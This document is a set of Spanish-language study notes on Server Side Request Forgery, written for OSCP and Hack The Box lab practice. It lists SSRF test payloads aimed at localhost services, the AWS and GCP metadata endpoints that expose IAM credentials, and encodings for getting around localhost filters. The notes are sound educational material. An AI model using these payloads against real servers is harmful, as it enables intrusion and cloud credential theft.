# SSRF — Server Side Request Forgery

## ¿Qué es?

Engañas al servidor para que él haga una petición HTTP en tu nombre hacia donde tú le dices. El servidor actúa como puente hacia recursos que tú no puedes alcanzar directamente.

```
Sin SSRF:  Tú → ✗ → recurso interno
Con SSRF:  Tú → servidor → recurso interno → te devuelve respuesta
```

---

## Cómo lo reconoces en una máquina

Cualquier funcionalidad donde la web hace una petición basada en tu input:

```
- Campo "URL de imagen" o "importar desde enlace"
- "Vista previa de página"
- "Webhook URL"
- Parámetros: ?url= ?path= ?dest= ?file= ?uri= ?redirect=
```

---

## Cómo testear

```bash
# Paso 1 — confirmar SSRF
# Arrancas un servidor en Kali
python3 -m http.server 80

# Metes tu IP en el campo
http://TU_IP/test

# Si recibes la petición en tu servidor → SSRF confirmado

# Paso 2 — apuntar a recursos internos
http://127.0.0.1/
http://127.0.0.1/admin
http://127.0.0.1:8080
http://127.0.0.1:6379    ← Redis
http://127.0.0.1:3306    ← MySQL
http://192.168.1.X/      ← red interna
```

---

## Qué puedes conseguir

```
Panel admin interno    → http://127.0.0.1/admin
Servicios internos     → Redis, MySQL, Memcached
Escanear red interna   → http://192.168.1.X
Leer archivos          → file:///etc/passwd
Credenciales cloud     → http://169.254.169.254/ (AWS metadata)
```

---

## Endpoint de metadatos cloud

Si la máquina está en AWS, GCP o Azure — muy valioso:

```bash
# AWS — credenciales IAM
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
```

---

## Bypasses cuando filtran 127.0.0.1

```bash
http://localhost/
http://0.0.0.0/
http://0/
http://[::1]/              ← IPv6
http://127.0.0.1.nip.io/
http://2130706433/         ← decimal de 127.0.0.1
http://0x7f000001/         ← hex de 127.0.0.1
http://①②⑦.⓪.⓪.①/       ← unicode
```

---

## Ejemplo real en máquina HTB/OSCP

La web tiene un campo "previsualizar URL":

```
# Tú metes
http://127.0.0.1/admin

# El servidor hace internamente
curl http://127.0.0.1/admin

# Te devuelve
El panel de admin que solo es accesible desde localhost
```

Tú desde fuera no puedes ver ese panel. El servidor sí. Lo usas como puente.

---

## Flujo completo en una máquina

```
1. Identificas parámetro sospechoso (?url= o campo de URL)
2. Metes tu IP → ¿recibes petición en tu servidor?
3. Si sí → SSRF confirmado
4. Apuntas a 127.0.0.1 y diferentes puertos
5. Encuentras servicio interno o panel admin
6. Lo explotas para avanzar en la máquina
```

---

## En el OSCP

Aparece en máquinas Medium y Hard. Normalmente como paso intermedio:

```
SSRF → panel admin interno → RCE
SSRF → puerto interno vulnerable → explotar servicio
SSRF → metadatos cloud → credenciales
```

No necesitas dominarlo en profundidad — con reconocerlo y saber el flujo básico es suficiente.

---

## Resumen mental

```
Ves ?url= o campo de URL    → posible SSRF
Testeas con tu IP           → ¿recibes petición?
Apuntas a 127.0.0.1         → accedes a recursos internos
Si filtran 127.0.0.1        → usas bypasses
```

## Referencias
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- https://portswigger.net/web-security/ssrf
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
